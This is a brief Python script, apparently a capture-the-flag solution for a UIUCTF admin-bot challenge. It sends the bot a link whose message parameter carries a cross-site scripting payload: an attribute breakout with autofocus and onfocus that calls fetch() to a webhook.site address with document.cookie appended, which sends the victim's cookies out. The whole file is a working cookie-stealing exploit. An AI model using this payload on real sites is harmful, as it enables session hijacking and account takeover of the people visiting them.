#!/usr/bin/env python3
import urllib.parse

import requests


def main():
    base_url = "https://inst-2bb7a32c8930df34-adminbot-ruler-of-the-universe.chal.uiuc.tf/"
    webhook_url = "https://webhook.site/f007298f-f20d-4df4-bd52-a7a4ab446b8f?"

    payload = urllib.parse.quote(f"\"\" autofocus onfocus=\"fetch('{webhook_url}'+document.cookie);")
    json_data = { "url_part": f"module/0?message={payload}" }

    response = requests.post(base_url, json=json_data)
    print(response.status_code)


if __name__ == "__main__":
    main()
